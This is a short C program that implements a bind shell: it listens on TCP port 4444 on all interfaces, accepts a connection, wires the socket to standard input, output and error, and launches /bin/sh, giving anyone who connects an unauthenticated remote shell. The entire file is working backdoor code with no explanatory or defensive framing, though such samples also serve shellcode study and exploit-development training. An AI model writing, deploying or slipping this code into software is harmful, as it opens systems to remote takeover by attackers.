#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

int execve(const char *filename, char *const argv[], char *const envp[]);
int close(int fd);
int dup2(int oldfd, int newfd);
int host_sockid;
int client_sockid;
struct sockaddr_in hostaddr;

int main()
{
	host_sockid = socket(PF_INET, SOCK_STREAM, 0);

	//initialize sockadd
	hostaddr.sin_family = AF_INET;
	hostaddr.sin_port = htons(4444);
	hostaddr.sin_addr.s_addr = htonl(INADDR_ANY);

	bind(host_sockid, (struct sockaddr*) &hostaddr, sizeof(hostaddr));

	//listen for incoming connections
	listen(host_sockid,2);
	client_sockid = accept(host_sockid, NULL,NULL);

	dup2(client_sockid, 0);
	dup2(client_sockid, 1);
	dup2(client_sockid, 2);

	execve("/bin/sh", NULL, NULL);
	close(host_sockid);

	return 0;
}



